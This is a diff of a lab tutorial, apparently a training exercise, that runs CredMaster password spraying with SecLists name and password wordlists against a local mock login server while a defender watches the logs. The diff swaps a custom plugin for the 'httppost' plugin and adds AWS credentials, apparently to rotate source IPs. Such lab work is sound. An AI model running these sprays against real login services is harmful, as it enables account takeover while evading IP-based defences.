@@ -28,41 +28,6 @@ python3 mock_auth_server.py
 
 <img width="705" height="116" alt="2026-04-09_12-40" src="https://github.com/user-attachments/assets/afa7dfc5-4373-4d75-9027-6c1c7700250f" />
 
-
-## Write a CredMaster Plugin for Our Server
-
-CredMaster uses **plugins** (one per service type) that define how to format and send login requests. We will write a minimal one that talks to our local Flask server.
-
-Open another terminal
-
-```bash
-nano ~/BnB/credMaster/CredMaster/plugins/localtest.py
-```
-
-Paste in:
-
-```python
-import requests
-
-PLUGIN_NAME = "localtest"
-PLUGIN_DESCRIPTION = "Tests against a local mock auth server at 127.0.0.1:5000"
-
-def run(user, password, url="http://127.0.0.1:5000/auth/login", **kwargs):
-    headers = {"Content-Type": "application/json"}
-    payload = {"username": user, "password": password}
-
-    try:
-        response = requests.post(url, json=payload, headers=headers, timeout=5)
-        if response.status_code == 200:
-            return True
-    except requests.exceptions.RequestException:
-        pass
-
-    return False
-```
-
-Save and exit with `Ctrl+x` + `y` + `Enter`
-
 ---
 
 ## Open the Defender View
@@ -84,6 +49,12 @@ You now have three terminals running:
 - **Terminal 2** - the live log watcher (defender)
 - **Terminal 3** - ready for CredMaster (attacker)
 
+
+Before running the spray we need to create an **AWS Account**, go here and make an account: https://aws.amazon.com/
+
+<img width="785" height="135" alt="2026-04-09_13-24" src="https://github.com/user-attachments/assets/edb3cf0a-f47a-41d1-b92c-b1303fac1051" />
+
+
 In Terminal 3, run the spray:
 
 ```bash
@@ -95,11 +66,13 @@ source venv/bin/activate
 ```
 
 ```bash
-python3 credmaster.py \
-  --plugin localtest \
+(venv) ubuntu@ip-10-10-118-227:~/BnB/credMaster/CredMaster$ python3 credmaster.py \
+  --plugin httppost \
   -u /usr/share/seclists/Usernames/Names/names.txt \
   -p /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt \
-  --nofire \
+  --access_key YOUR_AWS_KEY \
+  --secret_access_key YOUR_AWS_SECRET \
+  --pluginargs url http://127.0.0.1:5000/auth/login content-type json \
   --delay 1 \
   --jitter 500
 ```
